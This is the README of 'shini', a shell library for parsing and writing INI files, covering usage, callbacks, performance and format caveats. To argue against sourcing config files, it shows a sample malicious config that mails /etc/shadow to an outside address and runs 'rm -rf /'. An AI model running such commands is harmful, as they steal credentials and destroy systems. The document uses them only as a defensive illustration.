shini [![Build Status](https://travis-ci.org/wallyhall/shini.svg?branch=master)](https://travis-ci.org/wallyhall/shini)
=====

A small, minimialist, <s>portable</s> <em>compatible</em><sup>1</sup> `/bin/sh` routine for reading (and now very alpha-quality writing) of INI files.

<em><sup>1</sup> This script previously attempted to be "portable", that is to say - written in a manner that it would reliably have a good chance of running anywhere with no specific implementation coded inside.  In order to gain usable performance on INI files bigger than "very small", it has since been modified to include shell specific implementation for recent versions of `zsh`, `ksh` and `bash` - considerably increasing performance at the cost of code complexity.  Therefore, I am calling it 'compatible' herein.</em>

## TL;DR

Given `demo.ini` of:

```
[INI_SECTION]
key_name="hello world"
```

Then:

```
. shini.sh

# Read a key/value pair
VALUE="$(shini_read "demo.ini" "INI_SECTION" "key_name")"
echo "$VALUE"   # returns "hello world"

# Write a key/value pair
shini_write "demo.ini" "INI_SECTION" "key_name" "new value"
cat "demo.ini"  # [INI_SECTION]
                # key_name="new value"
```

Custom parsing of INI files is available, and is more efficient if reading large files or multiple key/value pairs.

## About

### What is `shini`?
As above.  It's a small set of functions written for inclusion in shell scripts, released under the MIT license.

[pachi-belero](https://github.com/pachi-belero/) has [forked to create a simplified version](https://github.com/pachi-belero/shini-simplified) which is specifically for `bash >= 3`.  If this better meets your needs, please embrace the nature of open-source and support his work!  (And send my blessings his way.)

### Is it slow?
Shell scripting was never designed with speed for this kind of processing in mind.  That said, on recent versions of `bash` (version 3 or newer) and `zsh` (and to a lesser extent `ksh` version 93 and newer) the performance is quite acceptable.

Other/older shells will fall back to expensive calls to `grep` and `sed`, an will perform significantly slower (potentially hundreds of times slower).

On an 2012 i7 MacBook, a 1900 line INI file will fully parse within 0.6s - and a single section therein in under 0.24s (`zsh`):

    $ wc -l tests/php.ini 
    1917 tests/php.ini

    $ time zsh ./test_perf.sh > /dev/null
    real    0m0.595s

    $ time bash ./test_perf.sh > /dev/null
    real    0m0.838s

    $ time ksh ./test_perf.sh > /dev/null
    real    0m2.901s

    $ time zsh ./test_perf.sh opcache > /dev/null
    real    0m0.237s

    $ time bash ./test_perf.sh opcache > /dev/null
    real    0m0.313s

    $ time ksh ./test_perf.sh opcache > /dev/null
    real    0m0.543s

### Why do I need it?
You probably don't.  But if you have or ever do find yourself writing a shell script which:
 * Needs system or user specific settings
 * Needs to read (or write to) an existing INI file

... then you might find `shini` saves you a lot of time, and makes things safer.

### How can it make things safer?
Because system and user specific settings in shell scripts usually end up implemented as:

```
# /usr/local/sbin/rootonlyscript
. /etc/myscript
if [ -n SETTING1 ]; then
  echo "You didn't specify SETTING1" 1>&2
fi
```

The settings file looks like:

```
# /etc/myscript
SETTING1='abc'
SETTING2='def'
```
... and everything is cool until *this* happens:

```
# /etc/myscript
SETTING1='abc'
SETTING2='def'
cat /etc/shadow | mail someone@wishyouwerehere.com
rm -rf /
```

Alas, bye bye shadow file - bye bye system.

`shini` only reads the file; never includes, interprets or executes it.  A better solution.

### So `shini` just makes my shell script secure?

Erm, no.  Please go away and learn to code before proceeding.

Remember:
 * Your config file must always have sane file permissions - even if its an INI file
 * `shini` is to be included in your script - so it should be located somewhere safe, and with read-only permissions

Best advice, if in doubt:

```
sudo chown root:root shini.sh
sudo chmod 644 shini.sh
```

## Usage

### Show me `shini`!

To see `shini` in action in under 2 minutes:

```
cd "$(mktemp -d -t shini)"
curl https://codeload.github.com/wallyhall/shini/tar.gz/master -o master.tar.gz
tar -xvzf master.tar.gz
chmod +x shini-master/example.sh
cd shini-master/
sh example.sh
```

You should be presented with some output like this:

```
Parsing...

  Section1.name='John Doe'
  Section1.organization='Acme Widgets Inc.'
  Section2.server='10.1.2.3'
  Section2.port='80'
  Section2.file='payroll.dat'
  Section2.this_value_was_in_hex='8739'
  Another_Section.test_key_22='test test test'
  Another_Section.var_with_leading_whitespace='value'
  Another_Section.whitespace_test='lots of whitespace'
  Another_Section.quoted_quotespace='  lots more whitespace  '
  Whitespace_Section.null_value=''

Complete.
```

You've just execute the shipped example/test script (`example.sh`) - which parses an example INI file (`example.ini`) - outputting the content in the format `[section].[key]=[value]`.

## Cool.  Now show me how to include and use it myself!

Inclusion of `shini` in your own project is easy.  You can put the content of `shini.sh` inline with your own code (not recommended, but acceptable.  Make sure you appropriately include the MIT license...), or 'source' it externally - i.e.:

```
. "$(dirname "$0")/shini.sh"
. "/usr/local/bin/shini.sh"
... etc
```

### The simplest case
If you want to read one or two specific key-values from a small INI file, you can use the `shini_read` helper function.  (Reading multiple keys with this is inefficient - it's a helper function for certain, and probably common, "simple scenarios".):

```
VALUE="$(shini_read "input.ini" "INI_SECTION" "key_name")"
```

`"INI_SECTION"` may be supplied as an empty string (`""`), where keys exist outside of a section.

### Non-trivial usage
If you want to read multiple key-values, parse larger INI files, or customise your handling of errors/comments/keys/etc - continue reading.

`shini` works by parsing INI files line by line - skipping comments and invoking callback functions on errors and parsed values.  Beware, only `shini_read` and `shini_write` are invoked as subshells.  Using the following guidance may result in your existing variables being overwritten by `shini`.

If you don't care about handling parse errors (`shini` will do this for you by default) then you only need define one callback function:

```
__shini_parsed ()
{
  # "$1" - section
  # "$2" - key
  # "$3" - value
}
```

Each argument can should be carefully handled - always double quote (unless you're certain what you're doing).  Never forget you can't guraruntee what is in the INI file being parsed - it could be with evil intent.

When you're ready, invoke the parse function:

```
shini_parse "settings.ini"
```

(For increased performance on really large INI files, you can call `shini_parse_section` and specify the specific INI section you're interested in: `shini_parse_section "settings.ini" "SomeSection"`)

Bingo.  A full (and simple example) can be found in `example.sh`.

### ...and what about writing data too?

Easy!

```
shini_write "filename.ini" "SECTION_NAME" "key_name" "Some value here!"
```

This will update existing values and append new ones.  As always - give really careful thought to your INI file filesystem permissions before allowing users to arbitarily change the content!

### Can I override the error handling?

Yes.  Just declare any or all of the following functions:

```
__shini_parse_error $LINE_NUM "$LINE"  # Error parsing a specific line
__shini_no_file_passed                 # No filename passed to the shini_parse()
__shini_file_unreadable "$INI_FILE"    # INI file wasn't readable (or wasn't a file)
```

## Known caveats, etc

### Does `shini` follow the official INI format standards?

There are no INI format standards - so yes it does and no it doesn't?

`shini` assumes:

 * Every declaration is on a new line
 * __Sections__ are contained in square brackets, and include `a-z`, `A-Z`, `0-9`, `-` and `_` (no spaces by default) - e.g. `[section]`
 * __Keys__ are followed by an assignment (equal) sign, and include `a-z`, `A-Z`, `0-9`, `-` and `_` (again, no spaces by default) - e.g. `key=`
 * __Values__ follow keys, on the same line.  Anything is valid, except double quotes and semi-colons.  Hexadecimal values (i.e. `0x123`) are parsed and converted to decimal for you.
 * __Comments__ are lines starting with a semi-colon (`;`), such lines are ignored.
 * __Whitespace__ is ignored everywhere - except in between non-whitespace characters in values.  Use double quotes (`"`) to be explicit (e.g. `key=" leading/trailing WS "`)

Due to portability constraints - some of the useful regex power isn't available to `shini`.

This caused some trade-offs - with a lack of efficient control over lazy vs greedy repeats and optional groups etc, comments can only follow key/pair values and empty lines (not sections) - and where it follows values, any whitespace between the value and semi-colon is included as the value.  Explicitly use of double-quotes around the value gets around this issue.

Otherwise, all known "obviously invalid" INI content gets picked up and reported.
